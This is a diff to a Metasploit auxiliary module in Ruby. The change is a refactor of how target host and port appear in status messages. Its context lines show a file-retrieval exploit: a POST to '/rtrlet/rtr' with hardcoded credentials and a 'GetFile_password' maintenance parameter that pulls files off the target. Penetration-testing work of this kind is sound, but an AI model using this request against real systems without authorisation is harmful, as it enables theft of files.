@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     post_data << "maintenance=GetFile_password&username=Ivanhoe&password=Scott&send=Submit"
 
-    print_status("#{rhost}:#{rport} - Sending request...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request...")
     res = send_request_cgi({
       'uri' => '/rtrlet/rtr',
       'method' => 'POST',
@@ -75,11 +75,11 @@ class MetasploitModule < Msf::Auxiliary
     }, 5)
 
     if res and res.code == 200 and res.body =~ /Last 100000000 kilobytes of/ and res.body =~ /File name/ and not res.body =~ /<br\/>File not found.<br\/>/
-      print_good("#{rhost}:#{rport} - File retrieved successfully!")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File retrieved successfully!")
       start_contents = res.body.index("<pre>") + 7
       end_contents = res.body.rindex("</pre>") - 1
       if start_contents.nil? or end_contents.nil?
-        print_error("#{rhost}:#{rport} - Error reading file contents")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Error reading file contents")
         return
       end
       contents = res.body[start_contents..end_contents]
@@ -91,9 +91,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_status("#{rhost}:#{rport} - File saved in: #{path}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to retrieve file")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve file")
       return
     end
   end
